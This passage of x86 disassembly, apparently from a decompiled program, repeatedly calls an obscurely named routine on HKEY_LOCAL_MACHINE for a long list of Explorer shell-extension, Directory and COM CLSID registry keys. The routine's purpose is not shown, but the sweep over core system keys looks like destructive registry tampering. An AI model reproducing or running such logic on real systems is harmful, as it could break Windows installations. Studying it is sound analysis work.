  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000038Eh
  push 0042B6A4h ; "SOFTWARE\Classes\Directory\shellex\PropertySheetHandlers"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000038Fh
  push 0042B71Ch ; "SOFTWARE\Classes\Directory\shellex\DragDropHandlers\WinRAR"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000390h
  push 0042B574h ; "SOFTWARE\Classes\Directory\shellex\DragDropHandlers"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000391h
  push 0042B348h ; "SOFTWARE\Classes\Directory\shellex\CopyHookHandlers\Sharing"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000392h
  push 0042B798h ; "SOFTWARE\Classes\Directory\shellex\CopyHookHandlers\MyDocuments"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000393h
  push 0042B81Ch ; "SOFTWARE\Classes\Directory\shellex\CopyHookHandlers\FileSystem"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000394h
  push 0042B8A0h ; "SOFTWARE\Classes\Directory\shellex\CopyHookHandlers\CDF"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000395h
  push 0042B914h ; "SOFTWARE\Classes\Directory\shellex\CopyHookHandlers"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000396h
  push 0042B980h ; "SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers\WinRAR"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000397h
  push 0042BA00h ; "SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers\Sharing"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000398h
  push 0042BA84h ; "SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers\Offline Files"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000399h
  push 0042BB70h ; "SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers\EncryptionMenu"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000039Ah
  push 0042BC00h ; "SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000039Bh
  push 0042BC74h ; "SOFTWARE\Classes\Directory\shellex"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000039Ch
  push 0042BCC0h ; "SOFTWARE\Classes\Directory\shell\find\ddeexec\topic"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000039Dh
  push 0042B180h ; "SOFTWARE\Classes\Directory\shell\find\ddeexec\application"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000039Eh
  push 0042BD4Ch ; "SOFTWARE\Classes\Directory\shell\find\ddeexec"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000039Fh
  push 0042BDACh ; "SOFTWARE\Classes\Directory\shell\find\command"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003A0h
  push 0042BE0Ch ; "SOFTWARE\Classes\Directory\shell\find"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003A1h
  push 0042BE5Ch ; "SOFTWARE\Classes\Directory\shell"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003A2h
  push 0042BEA4h ; "SOFTWARE\Classes\Directory\DefaultIcon"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003A3h
  push 0042BF34h ; "SOFTWARE\Classes\Directory\Background\shellex\ContextMenuHandlers\New"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003A4h
  push 0042BFC4h ; "SOFTWARE\Classes\Directory\Background\shellex\ContextMenuHandlers"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003A5h
  push 0042C04Ch ; "SOFTWARE\Classes\Directory\Background\shellex"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003A6h
  push 0042C0ACh ; "SOFTWARE\Classes\Directory\Background"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003A7h
  push 0042BEF8h ; "SOFTWARE\Classes\Directory"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003A8h
  push 0042C118h ; "SOFTWARE\Classes\CLSID\{00000001-4FEF-40D3-B3FA-E0531B897F98}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003A9h
  push 0042C1B8h ; "SOFTWARE\Classes\CLSID\{00000001-4FEF-40D3-B3FA-E0531B897F98}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003AAh
  push 0042C238h ; "SOFTWARE\Classes\CLSID\{00000010-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003ABh
  push 0042C2C8h ; "SOFTWARE\Classes\CLSID\{00000010-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003ACh
  push 0042C368h ; "SOFTWARE\Classes\CLSID\{00000010-0000-0010-8000-00AA006D2EA4}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003ADh
  push 0042C3E8h ; "SOFTWARE\Classes\CLSID\{00000011-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003AEh
  push 0042C4ACh ; "SOFTWARE\Classes\CLSID\{00000011-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003AFh
  push 0042C53Ch ; "SOFTWARE\Classes\CLSID\{00000011-0000-0010-8000-00AA006D2EA4}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003B0h
  push 0042C5BCh ; "SOFTWARE\Classes\CLSID\{00000013-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003B1h
  push 0042C65Ch ; "SOFTWARE\Classes\CLSID\{00000013-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003B2h
  push 0042C6FCh ; "SOFTWARE\Classes\CLSID\{00000013-0000-0010-8000-00AA006D2EA4}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003B3h
  push 0042C77Ch ; "SOFTWARE\Classes\CLSID\{00000014-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003B4h
  push 0042C848h ; "SOFTWARE\Classes\CLSID\{00000014-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003B5h
  push 0042C8D8h ; "SOFTWARE\Classes\CLSID\{00000014-0000-0010-8000-00AA006D2EA4}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003B6h
  push 0042C958h ; "SOFTWARE\Classes\CLSID\{00000015-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003B7h
  push 0042C9F8h ; "SOFTWARE\Classes\CLSID\{00000015-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003B8h
  push 0042C958h ; "SOFTWARE\Classes\CLSID\{00000015-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003B9h
  push 0042CA88h ; "SOFTWARE\Classes\CLSID\{00000015-0000-0010-8000-00AA006D2EA4}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003BAh
  push 0042CB08h ; "SOFTWARE\Classes\CLSID\{00000016-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003BBh
  push 0042CBA4h ; "SOFTWARE\Classes\CLSID\{00000016-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003BCh
  push 0042CC44h ; "SOFTWARE\Classes\CLSID\{00000016-0000-0010-8000-00AA006D2EA4}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003BDh
  push 0042CCC4h ; "SOFTWARE\Classes\CLSID\{00000017-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003BEh
  push 0042CD54h ; "SOFTWARE\Classes\CLSID\{00000017-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003BFh
  push 0042CDF4h ; "SOFTWARE\Classes\CLSID\{00000017-0000-0010-8000-00AA006D2EA4}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003C0h
  push 0042CE74h ; "SOFTWARE\Classes\CLSID\{00000018-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003C1h
  push 0042CF04h ; "SOFTWARE\Classes\CLSID\{00000018-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003C2h
  push 0042CFA4h ; "SOFTWARE\Classes\CLSID\{00000018-0000-0010-8000-00AA006D2EA4}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003C3h
  push 0042D024h ; "SOFTWARE\Classes\CLSID\{00000019-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003C4h
  push 0042D0B4h ; "SOFTWARE\Classes\CLSID\{00000019-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003C5h
  push 0042D154h ; "SOFTWARE\Classes\CLSID\{00000019-0000-0010-8000-00AA006D2EA4}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003C6h
  push 0042D1D4h ; "SOFTWARE\Classes\CLSID\{0000002F-0000-0000-C000-000000000046}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003C7h
  push 0042D298h ; "SOFTWARE\Classes\CLSID\{0000002F-0000-0000-C000-000000000046}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003C8h
  push 0042D318h ; "SOFTWARE\Classes\CLSID\{00000100-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003C9h
  push 0042D3A8h ; "SOFTWARE\Classes\CLSID\{00000100-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003CAh
  push 0042D448h ; "SOFTWARE\Classes\CLSID\{00000100-0000-0010-8000-00AA006D2EA4}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003CBh
  push 0042D4C8h ; "SOFTWARE\Classes\CLSID\{00000101-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003CCh
  push 0042D558h ; "SOFTWARE\Classes\CLSID\{00000101-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003CDh
  push 0042D5F8h ; "SOFTWARE\Classes\CLSID\{00000101-0000-0010-8000-00AA006D2EA4}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003CEh
  push 0042D678h ; "SOFTWARE\Classes\CLSID\{00000103-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003CFh
  push 0042D718h ; "SOFTWARE\Classes\CLSID\{00000103-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003D0h
  push 0042D7A8h ; "SOFTWARE\Classes\CLSID\{00000103-0000-0010-8000-00AA006D2EA4}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003D1h
  push 0042D828h ; "SOFTWARE\Classes\CLSID\{00000104-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003D2h
  push 0042D8C8h ; "SOFTWARE\Classes\CLSID\{00000104-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003D3h
  push 0042D958h ; "SOFTWARE\Classes\CLSID\{00000104-0000-0010-8000-00AA006D2EA4}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003D4h
  push 0042D9D8h ; "SOFTWARE\Classes\CLSID\{00000105-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003D5h
  push 0042DA68h ; "SOFTWARE\Classes\CLSID\{00000105-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003D6h
  push 0042DB08h ; "SOFTWARE\Classes\CLSID\{00000105-0000-0010-8000-00AA006D2EA4}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003D7h
  push 0042DB88h ; "SOFTWARE\Classes\CLSID\{00000106-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003D8h
  push 0042DC18h ; "SOFTWARE\Classes\CLSID\{00000106-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003D9h
  push 0042DCB8h ; "SOFTWARE\Classes\CLSID\{00000106-0000-0010-8000-00AA006D2EA4}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003DAh
  push 0042DD38h ; "SOFTWARE\Classes\CLSID\{00000107-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003DBh
  push 0042DDC8h ; "SOFTWARE\Classes\CLSID\{00000107-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003DCh
  push 0042DE68h ; "SOFTWARE\Classes\CLSID\{00000107-0000-0010-8000-00AA006D2EA4}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003DDh
  push 0042DEE8h ; "SOFTWARE\Classes\CLSID\{00000108-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003DEh
  push 0042DF78h ; "SOFTWARE\Classes\CLSID\{00000108-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003DFh
  push 0042E018h ; "SOFTWARE\Classes\CLSID\{00000108-0000-0010-8000-00AA006D2EA4}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003E0h
  push 0042E098h ; "SOFTWARE\Classes\CLSID\{00000109-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003E1h
  push 0042E128h ; "SOFTWARE\Classes\CLSID\{00000109-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003E2h
  push 0042E1C8h ; "SOFTWARE\Classes\CLSID\{00000109-0000-0010-8000-00AA006D2EA4}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003E3h
  push 0042E248h ; "SOFTWARE\Classes\CLSID\{00000300-0000-0000-C000-000000000046}\InprocServer32"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003E4h
  push 0042E2E8h ; "SOFTWARE\Classes\CLSID\{00000300-0000-0000-C000-000000000046}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003E5h
  push 0042E378h ; "SOFTWARE\Classes\CLSID\{00000303-0000-0000-C000-000000000046}\InprocServer32"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003E6h
  push 0042E418h ; "SOFTWARE\Classes\CLSID\{00000303-0000-0000-C000-000000000046}\ProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003E7h
  push 0042E4A8h ; "SOFTWARE\Classes\CLSID\{00000303-0000-0000-C000-000000000046}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003E8h
  push 0042E528h ; "SOFTWARE\Classes\CLSID\{00000304-0000-0000-C000-000000000046}\InprocServer32"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003E9h
  push 0042E5C8h ; "SOFTWARE\Classes\CLSID\{00000304-0000-0000-C000-000000000046}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003EAh
  push 0042E648h ; "SOFTWARE\Classes\CLSID\{00000305-0000-0000-C000-000000000046}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003EBh
  push 0042E70Ch ; "SOFTWARE\Classes\CLSID\{00000305-0000-0000-C000-000000000046}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003ECh
  push 0042E78Ch ; "SOFTWARE\Classes\CLSID\{00000306-0000-0000-C000-000000000046}\InprocServer32"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003EDh
  push 0042E82Ch ; "SOFTWARE\Classes\CLSID\{00000306-0000-0000-C000-000000000046}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003EEh
